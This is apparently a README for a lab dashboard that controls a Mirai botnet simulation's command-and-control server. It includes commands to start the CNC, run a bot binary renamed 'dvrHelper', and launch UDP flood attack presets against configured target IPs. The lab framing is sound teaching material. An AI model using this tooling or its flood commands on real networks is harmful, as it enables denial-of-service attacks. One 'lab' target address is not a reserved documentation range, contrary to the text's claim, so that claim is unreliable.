# Soft Command Deck — Mirai Lab Dashboard

Cute web dashboard for the **isolated Mirai simulation lab**.  
Replaces manual `telnet 127.0.0.1 23` → login → `botcount` with a live UI.

> **Educational / lab only.** Run only inside your offline Proxmox lab.  
> Do not point this at any real network.

---

## What you get

| Feature | Description |
|--------|-------------|
| **Live bot count** | Auto-polls CNC admin session (no more typing `botcount`) |
| **One-tap actions** | Bot count, lab attack presets (SG / KR), full status |
| **Custom command** | Same grammar as `admin@botnet#` |
| **Live console** | Aggregated dashboard ↔ CNC logs |
| **Topology map** | C2 / Loader / Bot / targets at a glance |
| **Cute cyber UI** | Soft neon glassmorphism theme |

Architecture:

```
Browser  →  Flask :8080  →  TCP CNC :23 (admin login)
                         →  optional ss peer count
```

Bot count still comes from **CNC in-memory** (`clientList`), same as the telnet UI.

---

## Layout

```
dashboard/
├── README.md
├── backend/
│   ├── app.py              # Flask API + static server
│   ├── cnc_client.py       # Telnet-style CNC client
│   └── requirements.txt
├── frontend/
│   ├── index.html
│   ├── style.css
│   └── app.js
├── proxmox_lab_setup.md
└── wireshark_guide.md
```

---

## Run on C2 (`185.10.20.100`)

### 1) CNC must already be running

```bash
cd ~/Mirai-Botnet-Simulation-Lab/mirai/release
ss -lntp | grep :23
# if empty:
nohup ./cnc > cnc.log 2>&1 &
```

### 2) Install & start dashboard

```bash
cd ~/Mirai-Botnet-Simulation-Lab/dashboard/backend
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 app.py
```

Open in browser:

- On C2: [http://127.0.0.1:8080](http://127.0.0.1:8080)
- From your PC (if routed): `http://185.10.20.100:8080`

Background:

```bash
nohup python3 app.py > dashboard.log 2>&1 &
```

### 3) Optional environment

```bash
export CNC_HOST=127.0.0.1
export CNC_PORT=23
export CNC_USER=admin
export CNC_PASS=admin
export DASH_PORT=8080
export LAB_TARGET_SG=203.0.113.100
export LAB_TARGET_KR=210.89.0.100
python3 app.py
```

Default CNC login matches `scripts/db.sql`: **admin / admin**.

---

## API (for tinkering)

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/api/status` | CNC up, bot total, distribution, TCP peers, logs |
| POST | `/api/botcount` | Force `botcount` |
| POST | `/api/command` | `{"command":"botcount"}` |
| POST | `/api/attack` | `{"target":"sg"|"kr", "duration":30, "method":"udp"}` |

---

## How it talks to CNC

1. TCP connect to `CNC_HOST:23` (same port as telnet admin).
2. Login with `CNC_USER` / `CNC_PASS`.
3. Send commands (e.g. `botcount`, `udp 203.0.113.100 30 dport=80`).
4. Parse title bar (`N Bots Connected`) + `botcount` distribution lines.
5. Optionally count non-localhost ESTABLISHED peers via `ss` as a hint.

If the UI says CNC offline: start `./cnc` first.  
If bots stay at 0: fix bot → CNC path (debug `mirai.dbg` / run as `./dvrHelper`).

---

## Bot side reminder (so count goes to 1+)

```bash
# on bot
cp mirai.x86 dvrHelper && ./dvrHelper
# or patched release / mirai.dbg that can reach 185.10.20.100:23
```

Dashboard only **displays and controls** — it does not replace the bot binary.

---

## Safety

- Bind carefully (`0.0.0.0:8080` is fine **inside lab VLANs** only).
- Do not expose this port to the public internet.
- Attack presets use **documentation lab IPs** from the Proxmox guide only.
